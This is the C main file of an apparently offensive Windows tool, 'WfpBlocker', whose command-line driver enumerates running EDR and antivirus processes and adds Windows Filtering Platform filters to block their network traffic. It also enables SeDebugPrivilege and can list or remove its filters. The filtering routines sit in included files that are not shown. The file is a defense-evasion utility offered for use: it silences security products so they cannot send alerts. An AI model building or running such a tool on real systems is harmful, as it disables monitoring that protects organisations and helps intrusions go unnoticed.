#include "commun.h"
#include "token.h"
#include "wfp.h"
#include "enumproc.h"
#include "edrlist.h"

static void help(const char* bin) {
    printf("\n  WfpBlocker - EDR Network Traffic Blocker via WFP\n\n");
    printf("  Usage: %s <option>\n\n", bin);
    printf("  Options:\n");
    printf("    -enumSec     Enumerate running EDR/AV processes\n");
    printf("    -blockSec    Add WFP filters to block detected EDR traffic\n");
    printf("    -listWFP     List our custom WFP filters\n");
    printf("    -revert      Remove all custom WFP filters\n");
    printf("    -listProc    List all running processes\n");
    printf("    -h           Show this help\n\n");
}

int main(int argc, char** argv) {
    if (argc < 2) {
        help(argv[0]);
        return -1;
    }

    if (!strncmp(argv[1], "-h", 3)) {
        help(argv[0]);
        return 0;
    }

    if (!IsProcessHighIntegrity()) {
        printf("[-] Not a high integrity process, run as Administrator\n");
        return -1;
    }
    printf("[+] High integrity process\n");

    if (!SetDebugPrivilege()) {
        printf("[-] Failed to enable SeDebugPrivilege\n");
        return -2;
    }
    printf("[+] SeDebugPrivilege enabled\n");

    if (!strncmp(argv[1], "-enumSec", 9)) {
        printf("\n[*] Security processes (%zu signatures):\n\n", edrCount);
        if (!enumSec(edrNames, edrCount)) {
            printf("[-] Failed to enumerate security processes (%u)\n", GetLastError());
            return -3;
        }
    }
    else if (!strncmp(argv[1], "-blockSec", 10)) {
        printf("\n[*] Adding WFP filters to block EDR traffic:\n");
        ApplyEdrTrafficBlockFilter(edrNames, edrCount);
    }
    else if (!strncmp(argv[1], "-listWFP", 9)) {
        printf("\n[*] Custom WFP filters:\n\n");
        if (!DisplayAllWfpFilters()) {
            printf("[-] Failed to list WFP filters (%u)\n", GetLastError());
            return -5;
        }
    }
    else if (!strncmp(argv[1], "-revert", 8)) {
        printf("\n[*] Reverting WFP filters:\n\n");
        RemoveCustomWfpFilters();
        printf("\n[+] Revert complete\n");
    }
    else if (!strncmp(argv[1], "-listProc", 10)) {
        printf("\n[*] All processes:\n\n");
        if (!listProc()) {
            printf("[-] Failed to list processes\n");
            return -6;
        }
    }
    else {
        printf("[-] Unknown option: %s\n", argv[1]);
        help(argv[0]);
        return -1;
    }

    printf("\n[+] Done\n");
    return 0;
}
